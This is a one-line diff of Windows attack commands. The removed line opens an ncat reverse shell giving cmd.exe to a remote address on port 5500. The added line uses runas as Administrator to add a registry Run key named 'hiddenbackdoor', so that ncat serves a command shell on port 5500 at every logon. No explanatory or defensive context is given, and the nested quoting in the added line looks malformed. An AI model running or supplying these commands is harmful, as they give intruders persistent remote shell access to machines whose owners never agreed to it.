@@ -1,1 +1,1 @@
-ncat 192.168.3.26 5500 -e cmd.exe
+runas /user:Administrator "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ /v hiddenbackdoor /d "C:\Program Files (x86)\Nmap\ncat.exe -lnp 5500 -e cmd.exe""
